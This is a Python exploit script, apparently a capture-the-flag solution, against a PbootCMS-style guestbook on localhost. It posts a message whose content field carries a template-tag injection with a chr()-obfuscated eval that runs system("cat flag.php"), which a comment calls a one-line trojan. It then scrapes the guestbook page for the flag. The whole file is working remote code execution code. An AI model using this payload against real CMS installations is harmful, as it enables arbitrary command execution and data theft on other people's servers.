from wsgiref import headers
import requests
import re


def myPost(url):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
    post = {
        'contacts': 'stephanieSuu',
        'mobile': '123456',
        'content': '{ppbopboot:ifot:ifboot:if((eval ( chr (0x73).chr (0x79).chr (0x73).chr (0x74).chr (0x65).chr ('
                   '0x6d).chr (0x28).chr (0x22).chr (0x63).chr (0x61).chr (0x74).chr (0x20).chr (0x66).chr (0x6c).chr '
                   '(0x61).chr (0x67).chr (0x2e).chr (0x70).chr (0x68).chr (0x70).chr (0x22).chr (0x29).chr ('
                   '0x3b))))}我今天吃饭了{/pbpbopboot:ifot:ifoot:if} '
        
        #执行system("cat flag.php")一句话木马
    }
    response = requests.post(url, data=post,headers= headers)
    if response.status_code == 200:
        print("Exp successed")
        return True
    else:
        print("Exp failed, response code=" + str(response.status_code))
        return False
           

def catchFlag():
    r = requests.get("http://127.0.0.1/?gbook/")
    flag = re.findall(r'''flag="(.+?)";''', r.text)
    if (len(flag)>=0):
        #多次插入exp会造成获取到多个flag，取一个即可
        print(flag[0])
    else:
        print("can not catch the Flag")
    


if __name__ == '__main__':
    url = "http://127.0.0.1/?message/"
    if myPost(url):
        catchFlag()
